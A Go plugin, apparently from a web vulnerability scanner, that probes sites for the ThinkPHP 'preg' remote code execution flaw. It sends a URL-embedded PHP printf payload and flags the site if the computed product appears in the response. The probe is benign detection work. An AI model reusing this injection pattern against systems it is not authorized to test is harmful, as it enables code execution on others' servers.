/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package thinkphp

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type PregRce struct {
}

func (*PregRce) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("开始检Start detection thinkphp/rce/preg, %s", flow.Request.URL())
			r1 := utils.RandInt(1000, 10000)
			r2 := utils.RandInt(1000, 10000)
			path := "/index.php?s=/aa/bb/name/$%7B@printf({{r1}}*{{r2}})%7D"
			path = strings.Replace(path, "{{r1}}", fmt.Sprintf("%d", r1), -1)
			path = strings.Replace(path, "{{r2}}", fmt.Sprintf("%d", r2), -1)
			reqUrl, err := flow.Request.URL().Parse(path)
			if err != nil {
				logger.Error(err)
				return nil
			}
			req, err := http.NewRequest("GET", reqUrl.String(), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, fmt.Sprintf("%d", r1*r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "website",
		Binding: &model.VulnBinding{ID: "thinkphp/rce/preg", Plugin: "thinkphp/rce/preg", Category: "thinkphp/rce/preg", Severity: model.SeverityCritical},
	}
}
